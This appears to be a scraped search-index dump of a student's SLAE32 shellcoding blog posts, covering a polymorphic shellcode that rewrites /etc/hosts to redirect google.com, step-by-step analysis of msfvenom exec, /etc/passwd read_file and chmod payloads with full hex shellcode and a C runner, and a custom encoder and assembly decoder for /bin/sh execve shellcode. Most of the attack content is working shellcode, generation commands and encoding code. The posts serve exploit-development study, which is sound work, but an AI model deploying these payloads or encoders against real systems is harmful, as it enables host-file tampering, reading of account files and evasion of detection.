77 bytes.08048080 &amp;lt;_start&amp;gt;:8048080: 31 c9 xor ecx,ecx8048082: f7 e1 mul ecx8048084: b0 05 mov al,0x58048086: 51 push ecx8048087: 68 6f 73 74 73 push 0x7374736f804808c: 68 2f 2f 2f 68 push 0x682f2f2f8048091: 68 2f 65 74 63 push 0x6374652f8048096: 89 e3 mov ebx,esp8048098: 66 b9 01 04 mov cx,0x401804809c: cd 80 int 0x80804809e: 93 xchg ebx,eax804809f: 6a 04 push 0x480480a1: 58 pop eax80480a2: eb 10 jmp 80480b4 &amp;lt;_load_data&amp;gt;080480a4 &amp;lt;_write&amp;gt;:80480a4: 59 pop ecx80480a5: 6a 14 push 0x1480480a7: 5a pop edx80480a8: cd 80 int 0x8080480aa: 6a 06 push 0x680480ac: 58 pop eax80480ad: cd 80 int 0x8080480af: 6a 01 push 0x180480b1: 58 pop eax80480b2: cd 80 int 0x80080480b4 &amp;lt;_load_data&amp;gt;:80480b4: e8 eb ff ff ff call 80480a4 &amp;lt;_write&amp;gt;080480b9 &amp;lt;google&amp;gt;:80480b9: 31 32 xor DWORD PTR [edx],esi80480bb: 37 aaa 80480bc: 2e 31 2e xor DWORD PTR cs:[esi],ebp80480bf: 31 2e xor DWORD PTR [esi],ebp80480c1: 31 20 xor DWORD PTR [eax],esp80480c3: 67 6f outs dx,DWORD PTR ds:[si]80480c5: 6f outs dx,DWORD PTR ds:[esi]80480c6: 67 6c ins BYTE PTR es:[di],dx80480c8: 65 2e 63 6f 6d gs arpl WORD PTR cs:[edi+0x6d],bpThe changesWe start by changing the way we zero out our registers. Instead of using the mul instruction we just zero out EAX and then use cdq to extend EAX to EDX affectively zeroing out EDX. We also use push/pop to setup our syscall values as opposed to mov statements.xor eax,eaxcdq...push byte 5pop eaxInstead of pushing the hex for /etc/hosts to the stack moving a pointer of ESP to EBX we instead opt to use the jmp/call/pop technique to acquire this value and save it into EBX. This saves us some space which allows us to get a smaller shellcode than the original. jmp short _file_file_load: pop ebx_file: call _file_load db &quot;/etc/hosts&quot;The resulting shellcode size is 71 bytes which is smaller than the 77 bytes of the original. The new code is shown below:08048080 &amp;lt;_start&amp;gt;:8048080: 31 c0 xor eax,eax8048082: 99 cdq 8048083: 6a 05 push 0x58048085: 58 pop eax8048086: 52 push edx8048087: eb 36 jmp 80480bf &amp;lt;_file&amp;gt;08048089 &amp;lt;_file_load&amp;gt;:8048089: 5b pop ebx804808a: 66 b9 01 04 mov cx,0x401804808e: cd 80 int 0x808048090: 93 xchg ebx,eax8048091: 6a 04 push 0x48048093: 58 pop eax8048094: eb 10 jmp 80480a6 &amp;lt;_load_data&amp;gt;08048096 &amp;lt;_write&amp;gt;:8048096: 59 pop ecx8048097: 6a 14 push 0x148048099: 5a pop edx804809a: cd 80 int 0x80804809c: 6a 06 push 0x6804809e: 58 pop eax804809f: cd 80 int 0x8080480a1: 6a 01 push 0x180480a3: 58 pop eax80480a4: cd 80 int 0x80080480a6 &amp;lt;_load_data&amp;gt;:80480a6: e8 eb ff ff ff call 8048096 &amp;lt;_write&amp;gt;80480ab: 31 32 xor DWORD PTR [edx],esi80480ad: 37 aaa 80480ae: 2e 31 2e xor DWORD PTR cs:[esi],ebp80480b1: 31 2e xor DWORD PTR [esi],ebp80480b3: 31 20 xor DWORD PTR [eax],esp80480b5: 67 6f outs dx,DWORD PTR ds:[si]80480b7: 6f outs dx,DWORD PTR ds:[esi]80480b8: 67 6c ins BYTE PTR es:[di],dx80480ba: 65 2e 63 6f 6d gs arpl WORD PTR cs:[edi+0x6d],bp080480bf &amp;lt;_file&amp;gt;:80480bf: e8 c5 ff ff ff call 8048089 &amp;lt;_file_load&amp;gt;80480c4: 2f das 80480c5: 65 74 63 gs je 804812b &amp;lt;_end+0x5b&amp;gt;80480c8: 2f das 80480c9: 68 6f 73 74 73 push 0x7374736fSource codeAll source code for this assignment can be found at https://github.com/tdmathison/SLAE32/tree/master/assignment6." }, { "title": "SLAE32: Analyzing MSF payloads for linux/x86", "url": "/posts/slae32-5/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-20 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #5Description Take up at least 3 shellcode samples created using msfpayload/msfvenom for linux/x86 Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode Present your analysisThe following three msfvenom payloads were analyzed:Sample1: linux/x86/execSample2: linux/x86/read_fileSample3: linux/x86/chmodSample1: linux/x86/execTo generate a payload with the linux/x86/exec payload I executed the following command to generate shellcode that could be placed into my test C program.[sengen@manjaro-x86 sample1]$ msfvenom -p linux/x86/exec cmd=&quot;pwd&quot; -e x86/shikata_ga_nai -b &#39;\\x00&#39; -f cNo platform was selected, choosing Msf::Module::Platform::Linux from the payloadNo Arch selected, selecting Arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 66 (iteration=0)x86/shikata_ga_nai chosen with final size 66Payload size: 66 bytesFinal size of c file: 303 bytesunsigned char buf[] =&quot;\\xda\\xc3\\xba\\x35\\xb7\\x98\\xe3\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1&quot;&quot;\\x0a\\x83\\xc0\\x04\\x31\\x50\\x16\\x03\\x50\\x16\\xe2\\xc0\\xdd\\x93\\xbb&quot;&quot;\\xb3\\x70\\xc2\\x53\\xee\\x17\\x83\\x43\\x98\\xf8\\xe0\\xe3\\x58\\x6f\\x28&quot;&quot;\\x96\\x31\\x01\\xbf\\xb5\\x93\\x35\\xbb\\x39\\x13\\xc6\\xb4\\x4e\\x77\\xc6&quot;&quot;\\x63\\xe2\\xfe\\x27\\x46\\x84&quot;;I then copied this into a test C program and made sure that it executed. If working properly it should print the current working directory (pwd).NOTE: One thing to note here is that I have excluded null bytes as they don’t play well in shellcode. Due to this, the x86/shikata_ga_nai encoded has been used there will be additional assembly we need to work through before getting the the target assembly that will do our work.#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;unsigned char code[] = \\&quot;\\xda\\xc3\\xba\\x35\\xb7\\x98\\xe3\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1&quot;&quot;\\x0a\\x83\\xc0\\x04\\x31\\x50\\x16\\x03\\x50\\x16\\xe2\\xc0\\xdd\\x93\\xbb&quot;&quot;\\xb3\\x70\\xc2\\x53\\xee\\x17\\x83\\x43\\x98\\xf8\\xe0\\xe3\\x58\\x6f\\x28&quot;&quot;\\x96\\x31\\x01\\xbf\\xb5\\x93\\x35\\xbb\\x39\\x13\\xc6\\xb4\\x4e\\x77\\xc6&quot;&quot;\\x63\\xe2\\xfe\\x27\\x46\\x84&quot;;main(){ printf(&quot;Shellcode Length: %d\\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret();}[sengen@manjaro-x86 sample1]$ gcc pwd_payload.c -o pwd_payload[sengen@manjaro-x86 sample1]$ ./pwd_payloadShellcode Length: 66/home/sengen/work/slae32/assignment5/sample1Getting a general idea of the flow via LibEmu (sctest)Running this gives us two things: Some sudo code that shows system calls that have occurred along with the parameters, second we are generating a graph file to visually represent what would be executing.In this particular example it appears we are getting one call to execve that is executing “/bin/sh -c pwd”. We’ll walk through the assembly to observe how it got to this point.[sengen@manjaro-x86 sample1]$ msfvenom -p linux/x86/exec cmd=&quot;pwd&quot; -e x86/shikata_ga_nai -b &#39;\\x00&#39; -f raw | sctest -v -Ss 10000 -G pwd_payload.dot...int execve ( const char * dateiname = 0x00416fc4 =&amp;gt; = &quot;/bin/sh&quot;; const char * argv[] = [ = 0x00416fb4 =&amp;gt; = 0x00416fc4 =&amp;gt; = &quot;/bin/sh&quot;; = 0x00416fb8 =&amp;gt; = 0x00416fcc =&amp;gt; = &quot;-c&quot;; = 0x00416fbc =&amp;gt; = 0x00417038 =&amp;gt; = &quot;pwd&quot;; = 0x00000000 =&amp;gt; none; ]; const char * envp[] = 0x00000000 =&amp;gt; none;) = 0;Generated graph from LibEmuGenerated via the command dot pwd_payload.dot -Tpng -o pwd_payload.png. The graph here shows a loop that occurs prior to the instructions that actually do our execve. This loop is the decoder routine as a result of x86/shikata_ga_nai.Stepping through shellcode with GDBDecoder schemeThe shellcode starts by moving into a loop where the shellcode is decoded in full dword segments (4 bytes at a time). When this process is complete the it will move on to the actual shellcode to perform the “pwd” command.[sengen@manjaro-x86 assignment5]$ gdb ./pwd_payloadgdb$ disassembdisassemble &amp;amp;codeDump of assembler code for function code:=&amp;gt; 0x00402040 &amp;lt;+0&amp;gt;: fcmovb st,st(3) 0x00402042 &amp;lt;+2&amp;gt;: mov edx,0xe398b735 0x00402047 &amp;lt;+7&amp;gt;: fnstenv [esp-0xc] 0x0040204b &amp;lt;+11&amp;gt;: pop eax 0x0040204c &amp;lt;+12&amp;gt;: sub ecx,ecx 0x0040204e &amp;lt;+14&amp;gt;: mov cl,0xa 0x00402050 &amp;lt;+16&amp;gt;: add eax,0x4 ; decoder loop 0x00402053 &amp;lt;+19&amp;gt;: xor DWORD PTR [eax+0x16],edx ; decoder loop 0x00402056 &amp;lt;+22&amp;gt;: add edx,DWORD PTR [eax+0x16] ; decoder loop 0x00402059 &amp;lt;+25&amp;gt;: loop 0x40201b ; decoder loop ... instructions below here will be XOR&#39;edEnd of assembler dump.Setting up the callWe start to push onto the stack the first two pieces of the command. The “-c” is pushed to the stack and the stack location and stored into EDI. The “/bin/sh” is pushed onto the stack and the stack location is stored into EBX.A CALL at 0x00402078 is performed. The purpose of this is so that the stack contains the next address which is 0x00402078 which happens to contain a pointer to the text “pwd”.=&amp;gt; 0x0040205b &amp;lt;+27&amp;gt;: push 0xb ; 0xb = execve 0x0040205d &amp;lt;+29&amp;gt;: pop eax ; 0xb = execve 0x0040205e &amp;lt;+30&amp;gt;: cdq ; EDX=0x0 (EAX extend) 0x0040205f &amp;lt;+31&amp;gt;: push edx ; push 0x0 to stack 0x00402060 &amp;lt;+32&amp;gt;: pushw 0x632d ; &quot;-c&quot; 0x00402064 &amp;lt;+36&amp;gt;: mov edi,esp ; edi = pointer to stack 0x00402066 &amp;lt;+38&amp;gt;: push 0x68732f ; &quot;/sh&quot; 0x0040206b &amp;lt;+43&amp;gt;: push 0x6e69622f ; &quot;/bin&quot; 0x00402070 &amp;lt;+48&amp;gt;: mov ebx,esp ; ebx = pointer to stack 0x00402072 &amp;lt;+50&amp;gt;: push edx ; push 0x0 to stack 0x00402073 &amp;lt;+51&amp;gt;: call 0x40207c &amp;lt;code+60&amp;gt; ; 0x00402078 =&amp;gt; &quot;pwd&quot; 0x00402078 &amp;lt;+56&amp;gt;: jo 0x4020f1Now that the stack contains [0x00402078 0x00000000] which is effectively “pwd\\0” we perform two more pushes to setup the full command that we’ll send to the execve system call.After these instructions ECX will point to [0xbffff012, 0xbffff01a, 0x00402078, 0x00000000] on the stack. 0x40207c &amp;lt;code+60&amp;gt;: push edi ; pushes &quot;-c&quot; address 0x40207d &amp;lt;code+61&amp;gt;: push ebx ; pushes &quot;/bin/sh&quot; address 0x40207e &amp;lt;code+62&amp;gt;: mov ecx,esp ; moves pointer to stack to ecxWe finally make our call to execve which prints the current working directory. 0x402080 &amp;lt;code+64&amp;gt;: int 0x80 ; calls execveSample2: linux/x86/read_fileTo generate a payload with the linux/x86/read_file payload I executed the following command to generate shellcode that could be placed into my test C program.[sengen@manjaro-x86 sample2]$ msfvenom -p linux/x86/read_file fd=1 path=/etc/passwd -b &#39;\\x00&#39; -f cNo platform was selected, choosing Msf::Module::Platform::Linux from the payloadNo Arch selected, selecting Arch: x86 from the payloadFound 10 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 100 (iteration=0)x86/shikata_ga_nai chosen with final size 100Payload size: 100 bytesFinal size of c file: 445 bytesunsigned char buf[] =&quot;\\xba\\xb0\\xf6\\x73\\xfc\\xda\\xc6\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1&quot;&quot;\\x13\\x83\\xc6\\x04\\x31\\x56\\x0f\\x03\\x56\\xbf\\x14\\x86\\x17\\x89\\x60&quot;&quot;\\x6c\\xe8\\xf5\\x90\\x34\\xd9\\x3c\\x5d\\x4a\\x90\\x7d\\xe6\\x48\\xa3\\x81&quot;&quot;\\x17\\xc6\\x44\\x08\\xee\\x62\\x8a\\x1a\\x11\\x93\\x46\\x9a\\x98\\x51\\xe0&quot;&quot;\\x9e\\x9a\\x55\\x11\\x25\\x9b\\x55\\x11\\x59\\x51\\xd5\\xa9\\x58\\x69\\xd6&quot;&quot;\\xc9\\xe1\\x69\\xd6\\xc9\\x15\\xa7\\x56\\x21\\xd0\\xc8\\xa8\\x4d\\xf5\\x53&quot;&quot;\\x23\\xd1\\x26\\xec\\xaa\\x66\\x4b\\x7b\\x49\\x89&quot;;Copied the shellcode to a test program and made sure it worked[sengen@manjaro-x86 sample2]$ gcc readfile_payload.c -o readfile_payload[sengen@manjaro-x86 sample2]$ ./readfile_payloadShellcode Length: 100root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologindaemon:x:2:2:daemon:/:/usr/bin/nologinmail:x:8:12:mail:/var/spool/mail:/usr/bin/nologinftp:x:14:11:ftp:/srv/ftp:/usr/bin/nologinhttp:x:33:33:http:/srv/http:/usr/bin/nologindbus:x:81:81:dbus:/:/usr/bin/nologinnobody:x:99:99:nobody:/:/usr/bin/nologinsystemd-journal-gateway:x:191:191:systemd-journal-gateway:/:/usr/bin/nologinsystemd-timesync:x:192:192:systemd-timesync:/:/usr/bin/nologinsystemd-network:x:193:193:systemd-network:/:/usr/bin/nologinsystemd-bus-proxy:x:194:194:systemd-bus-proxy:/:/usr/bin/nologinsystemd-resolve:x:195:195:systemd-resolve:/:/usr/bin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/sbin/nologinsystemd-journal-upload:x:997:997:systemd Journal Upload:/:/sbin/nologinsystemd-journal-remote:x:999:999:systemd Journal Remote:/:/sbin/nologinuuidd:x:68:68::/:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/dev/null:/bin/falsednsmasq:x:996:996:dnsmasq daemon:/:/sbin/nologinavahi:x:84:84:avahi:/:/bin/nologinpolkitd:x:102:102:Policy Kit Daemon:/:/usr/bin/nologinrtkit:x:133:133:RealtimeKit:/proc:/bin/falseusbmux:x:140:140:usbmux user:/:/sbin/nologincolord:x:124:124::/var/lib/colord:/bin/falsegdm:x:120:120:Gnome Display Manager:/var/lib/gdm:/sbin/nologinntp:x:87:87:Network Time Protocol:/var/lib/ntp:/bin/falsenm-openconnect:x:995:995:NetworkManager OpenConnect:/:/usr/bin/nologinnm-openvpn:x:994:994:NetworkManager OpenVPN:/:/usr/bin/nologinsengen:x:1000:1000:sengen:/home/sengen:/bin/bashgit:x:993:993:git daemon user:/:/bin/bashpostgres:x:88:88:PostgreSQL user:/var/lib/postgres:/bin/bashAnalyzing program with GDBSimilar to the first sample, some encoding is happening on the shellcode so when we dump the assembly before running anything it will show the decoder routine followed by nonsensical instructions that have yet to be XOR’ed back to something useful.DecodingOur decode loop looks like the following0x00402050 &amp;lt;+16&amp;gt;: add esi,0x40x00402053 &amp;lt;+19&amp;gt;: xor DWORD PTR [esi+0xf],edx0x00402056 &amp;lt;+22&amp;gt;: add edx,DWORD PTR [esi+0xf]0x00402059 &amp;lt;+25&amp;gt;: loop 0x402050 &amp;lt;code+16&amp;gt;Getting memory location to the file pathTo acquire the string “/etc/passwd” the msfvenom payload is using a jump/call trick.0x0040205b &amp;lt;+27&amp;gt;: jmp 0x402093 &amp;lt;code+83&amp;gt; ; jump ahead near our stringWe land on the following instruction where we just turn around and make a call back to where we came from. By making a call like this the next memory address is pushed on the stack which happens to be where our string “/etc/passed” is stored.0x402093 &amp;lt;code+83&amp;gt;: call 0x40205d &amp;lt;code+29&amp;gt;There is no intent to return from the above call as we’ll now pop the address into EBX for use in our “open” system call. The system call is defined as:int open(const char *pathname, int flags);EBX contains the pathnameECX contains the flags0x0040205d &amp;lt;+29&amp;gt;: mov eax,0x5 ; value of &quot;open&quot; system call0x00402062 &amp;lt;+34&amp;gt;: pop ebx ; get the address to &quot;/etc/passwd&quot;0x00402063 &amp;lt;+35&amp;gt;: xor ecx,ecx ; zero out ecx0x00402065 &amp;lt;+37&amp;gt;: int 0x80 ; #define __NR_open 5Now that the file has been opened we can perform a read of the contents into a 4096 byte buffer. The “open” system call returned to us a file descriptor (3) that we can now use for reading. The “read” system call is defined as:ssize_t read(int fd, void *buf, size_t count);The resulting content that was read will be pointed to by ECX.0x00402067 &amp;lt;+39&amp;gt;: mov ebx,eax ; ebx = 30x00402069 &amp;lt;+41&amp;gt;: mov eax,0x3 ; eax = 3 (already was)0x0040206e &amp;lt;+46&amp;gt;: mov edi,esp ; edi = pointer to stack0x00402070 &amp;lt;+48&amp;gt;: mov ecx,edi ; ecx = pointer to stack0x00402072 &amp;lt;+50&amp;gt;: mov edx,0x1000 ; edx = 40960x00402077 &amp;lt;+55&amp;gt;: int 0x80 ; #define __NR_read 3Now that the content is stored in our buffer it will be written to the stdcout pre-defined file descriptor (1). The “write” system call is defined as:ssize_t write(int fd, const void *buf, size_t count);At this point it is a matter of writing the buffer pointed to by ECX to STDOUT which will show the content on the console.0x00402079 &amp;lt;+57&amp;gt;: mov edx,eax ; edx = read return value0x0040207b &amp;lt;+59&amp;gt;: mov eax,0x4 ; eax = 4 // write0x00402080 &amp;lt;+64&amp;gt;: mov ebx,0x1 ; ebx = 1 // STDOUT0x00402085 &amp;lt;+69&amp;gt;: int 0x80 ; #define __NR_write 4Sample3: linux/x86/chmodTo generate a payload with the linux/x86/chmod payload I executed the following command to generate shellcode that could be placed into my test C program.[sengen@manjaro-x86 sample3]$ msfvenom -p linux/x86/chmod file=/tmp/test.txt mode=0755 -b &#39;\\x00&#39; -f cNo platform was selected, choosing Msf::Module::Platform::Linux from the payloadNo Arch selected, selecting Arch: x86 from the payloadFound 10 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 65 (iteration=0)x86/shikata_ga_nai chosen with final size 65Payload size: 65 bytesFinal size of c file: 299 bytesunsigned char buf[] =&quot;\\xbd\\x58\\xd7\\xe5\\xe6\\xd9\\xed\\xd9\\x74\\x24\\xf4\\x58\\x33\\xc9\\xb1&quot;&quot;\\x0a\\x31\\x68\\x14\\x83\\xe8\\xfc\\x03\\x68\\x10\\xba\\x22\\x7c\\x8c\\x35&quot;&quot;\\x95\\x2d\\xb9\\x47\\x25\\xd2\\x39\\x78\\x51\\xbf\\x49\\xa9\\xed\\x5a\\xd9&quot;&quot;\\xc1\\x23\\xd1\\x65\\x5d\\x3c\\x42\\xfe\\x70\\x3d\\x74\\xfe\\xd3\\xf3\\xf4&quot;&quot;\\x94\\xe2\\x53\\x38\\xe8&quot;;Copied the shellcode to a test program and made sure it workedOnce compiled with GCC I created a temp file and that defaulted to 644 and ran the shellcode against it to change it to 755.[sengen@manjaro-x86 sample3]$ gcc chmod_payload.c -o chmod_payload[sengen@manjaro-x86 sample3]$ touch /tmp/test.txt[sengen@manjaro-x86 sample3]$ ll /tmp/test.txt-rw-r--r-- 1 sengen sengen 0 Jan 20 19:06 /tmp/test.txt[sengen@manjaro-x86 sample3]$ ./chmod_payloadShellcode Length: 65[sengen@manjaro-x86 sample3]$ ll /tmp/test.txt-rwxr-xr-x 1 sengen sengen 0 Jan 20 19:06 /tmp/test.txtCreating a graph with LibEmu[sengen@manjaro-x86 sample3]$ msfvenom -p linux/x86/chmod file=/tmp/test.txt mode=0755 -b &#39;\\x00&#39; -f raw | sctest -v -Ss 10000 -G chmod_payload.dot[sengen@manjaro-x86 sample3]$ dot chmod_payload.dot -Tpng -o chmod_payload.pngThe graph of program flow shows the shakita_ga_nai decoder followed by the setup for the chmod system call and finally an exit system call.Viewing the assembly in GDBAs we saw in the program flow graph above there is a loop where we decode our bytes. The decoding loop was identified as the instructions below:0x00402050 &amp;lt;+16&amp;gt;: xor DWORD PTR [eax+0x14],ebp0x00402053 &amp;lt;+19&amp;gt;: sub eax,0xfffffffc0x00402056 &amp;lt;+22&amp;gt;: add ebp,DWORD PTR [eax+0x10]0x00402059 &amp;lt;+25&amp;gt;: loop 0x402050 &amp;lt;code+16&amp;gt;We set EAX to 15 which is the chmod system call number and push a null byte to the stack. The CALL statement will push the address of the next instruction onto the stack. This address happens to be a pointer to our string “/tmp/test.txt”.0x0040205b &amp;lt;+27&amp;gt;: cdq ; edx = 0 (eax extend)0x0040205c &amp;lt;+28&amp;gt;: push 0xf ; push 15 to stack0x0040205e &amp;lt;+30&amp;gt;: pop eax ; eax = 150x0040205f &amp;lt;+31&amp;gt;: push edx ; push null byte to stack0x00402060 &amp;lt;+32&amp;gt;: call 0x402073 &amp;lt;code+51&amp;gt; ; jump to +51We immediately pop the address to our path string from the stack into EBX. We set our mode of 755 (octal) in hex which is 0x1ED and finally interrupt.0x00402073 &amp;lt;+51&amp;gt;: pop ebx ; ebx = &quot;/tmp/test.txt&quot;0x00402074 &amp;lt;+52&amp;gt;: push 0x1ed ; 755 in octal (mode)0x00402079 &amp;lt;+57&amp;gt;: pop ecx ; ecx = mode0x0040207a &amp;lt;+58&amp;gt;: int 0x80 ; #define __NR_chmod 15Lastly, we set EAX to 1 in order to perform an exit system call.0x0040207c &amp;lt;+60&amp;gt;: push 0x1 ; push 1 to stack0x0040207e &amp;lt;+62&amp;gt;: pop eax ; eax = 10x0040207f &amp;lt;+63&amp;gt;: int 0x80 ; #define __NR_exit 1Source codeAll source code for this assignment can be found at https://github.com/tdmathison/SLAE32/tree/master/assignment5." }, { "title": "SLAE32: Creation of custom encoding scheme", "url": "/posts/slae32-4/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-19 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #4Goals Take a simple shellcode that uses execve to spawn /bin/sh and run it through a custom encoder Explain the custom encoder and show it executingWhat is an encoder?An encoder can be defined as an implementation of transforming data from one format to another using a publicly known scheme that can be reversed. That is, it is not a form of encryption but rather a way to compress or change the form of data. In this case, known shellcode will be mangled by both shifting bytes around and inserting bytes. Upon decoding the reverse will happen which will allow the shellcode to run again.The shellcode to encodeThe following shellcode will spawn /bin/sh when executed. This will be the basis of what we will encode with the custom encoder.global _start section .text_start: ; PUSH the first null dword xor eax, eax push eax ; PUSH //bin/sh (8 bytes) push 0x68732f2f push 0x6e69622f mov ebx, esp push eax mov edx, esp push ebx mov ecx, esp mov al, 11 int 0x80The custom encoderSwapSert EncoderThe idea of this encoder is that it will swap two adjacent bytes and then insert a byte. The inserted byte in this example will be 0x7f.Encoding phase Step Sequence What is happening? 1 \\x41 \\x42 \\x43 \\x44 starting bytes 2 \\x42 \\x41 \\x7f \\x43 \\x44 swap 1st/2nd bytes and insert byte 3 \\x42 \\x41 \\x7f \\x44 \\x43 \\x7f swap 3rd/4th bytes and insert byte Example of this being done on the first 8 bytes of our shellcodePython script to encode a byte array#!/usr/bin/pythonshellcode = b&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f&quot; \\ b&quot;\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89&quot; \\ b&quot;\\xe1\\xb0\\x0b\\xcd\\x80&quot;encoded = &quot;&quot;encoded2 = &quot;&quot;print(&#39;Encoded shellcode ...&#39;)pos = 0insert_byte = b&quot;\\x7f&quot;while (pos+1) &amp;lt; len(shellcode): encoded += &quot;\\\\x%02x\\\\x%02x\\\\x%02x&quot; % (shellcode[pos+1], shellcode[pos], insert_byte[0]) encoded2 += &quot;0x%02x,0x%02x,0x%02x,&quot; % (shellcode[pos+1], shellcode[pos], insert_byte[0]) pos += 2if not pos == len(shellcode): encoded += &quot;\\\\x%02x\\\\x%02x\\\\x%02x&quot; % (insert_byte[0], shellcode[pos], insert_byte[0]) encoded2 += &quot;0x%02x,0x%02x,0x%02x&quot; % (insert_byte[0], shellcode[pos], insert_byte[0])print(&quot;Original: \\&quot;&quot; + &quot;&quot;.join(map(lambda x: &#39;\\\\x%02x&#39; % x, shellcode)) + &quot;\\&quot;&quot;)print(&quot;&quot;)print(&quot;Format1: \\&quot;&quot; + encoded + &quot;\\&quot;&quot;)print(&quot;Format2: &quot; + encoded2)Encoding the shellcode with the python script[sengen@manjaro-x86 assignment4]$ python3 swapsert-encoder.pyEncoded shellcode ...Original: &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;Format1: &quot;\\xc0\\x31\\x7f\\x68\\x50\\x7f\\x2f\\x2f\\x7f\\x68\\x73\\x7f\\x2f\\x68\\x7f\\x69\\x62\\x7f\\x89\\x6e\\x7f\\x50\\xe3\\x7f\\xe2\\x89\\x7f\\x89\\x53\\x7f\\xb0\\xe1\\x7f\\xcd\\x0b\\x7f\\x7f\\x80\\x7f&quot;Format2: 0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7fDecoding phase Step Sequence What is happening? 1 \\x42 \\x41 \\x7f \\x44 \\x 43 \\x7f starting encoded bytes 2 \\x41 \\x42 \\x44 \\x43 \\x7f swap 1st&amp;amp;2nd bytes and remove byte 3 \\x41 \\x42 \\x43 \\x44 swap 3rd/4th bytes and remove byte The decoder will acquire a reference to the location of the encoded bytes and perform the reverse actions to transform it back to executable shellcode. To perform this task I started will a skeleton assembly file setup to perform a JMP/CALL/POP so I have the address of the encoded shellcode.global _start section .text_start: jmp short call_shellcodedecoder: pop esidecode: jmp short EncodedShellcodecall_shellcode: call decoder EncodedShellcode: db 0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7fThe process of decoding requires a few things to be tracked: the current location of the last decoded byte, how far out the next set of bytes to grab is, and finally testing 3 bytes ahead for another \\x7f byte.NOTE: If by chance the shellcode is done and the next insert byte check happens to run into a \\x7f that is not part of the shellcode it would continue to swap bytes. Low chance, but it could happen. That said, it would not stop the shell from spawning on us and would only matter if the shellcode was back-to-back with additional instructions we needed to execute after the shell was spawned.Setting up registers and initial valuesThe first part of our shellcode will save a pointer to the first byte of our encoded shellcode. Since we are performing a JMP/CALL/POP we’ll be able to POP the memory location of the array of bytes we’ll be working with without having to know it’s address beforehand.EAX/EBX/ECX/EDX are all zeroed out as they will be used for swapping each pair of bytes and for tracking the offset where bytes are to be swapped into next.decoder: pop esi ; save location of encoded shellcode xor ebx,ebx ; zero out ebx - used for swapping xor ecx,ecx ; zero out ecx - insert byte tracking mul ecx ; zero out EAX/EDX - used for swapping mov edi,esi ; save encoded shellcode location into edi mov cl,2 ; location of next expected insert byteDecode loopNow we are in the decoding loop where we’ll continue to swap bytes and overshift 0x7f bytes. Our first check will be to determine whether we have a 0x7f byte in the next predetermined location indicating we should perform another swap. If we don’t see it there we’ll conclude that we are done swapping and we should exit the loop.cmp byte [esi+ecx], 0x7f ; should another swap occur?jne done ; jump out of loopNext, we perform a swap. We can’t swap the bytes between memory locations so we save each byte to a register and then save the register value back to opposite memory locations for perform the swap. ECX is tracking the location further ahead where the 0x7f byte is at and the two bytes to swap will always be the two bytes behind it.mov al, [esi+ecx-2] ; save first byte in pairmov bl, [esi+ecx-1] ; save second byte in pairmov [edi], bl ; swap bytemov [edi+1], al ; swap byteFinally, we adjust the offset of where the next 0x7f byte is expected and update the memory offset of where we would swap the bytes to. We then jump to the beginning of the loop where we test for the existence of the expected 0x7f byte.add ecx, 3 ; the next 0x7f byte should be 3 bytes aheadadd edi, 2 ; memory offset for next swap savejmp short decode ; jump back to the beginning of the loopCompleted decoder in x86 assemblyglobal _start section .text_start: jmp short call_shellcodedecoder: pop esi ; save location of encoded shellcode xor ebx,ebx ; zero out ebx - used for swapping xor ecx,ecx ; zero out ecx - insert byte tracking mul ecx ; zero out EAX/EDX - used for swapping mov edi,esi ; save encoded shellcode location into edi mov cl,2 ; location of next expected insert bytedecode: cmp byte [esi+ecx], 0x7f ; should another swap occur? jne done ; jump out of loop mov al, [esi+ecx-2] ; save first byte in pair mov bl, [esi+ecx-1] ; save second byte in pair mov [edi], bl ; swap byte mov [edi+1], al ; swap byte add ecx, 3 ; the next 0x7f byte should be 3 bytes ahead add edi, 2 ; memory offset for next swap save jmp short decode ; jump back to the beginning of the loopdone: jmp short EncodedShellcodecall_shellcode: call decoder EncodedShellcode: db 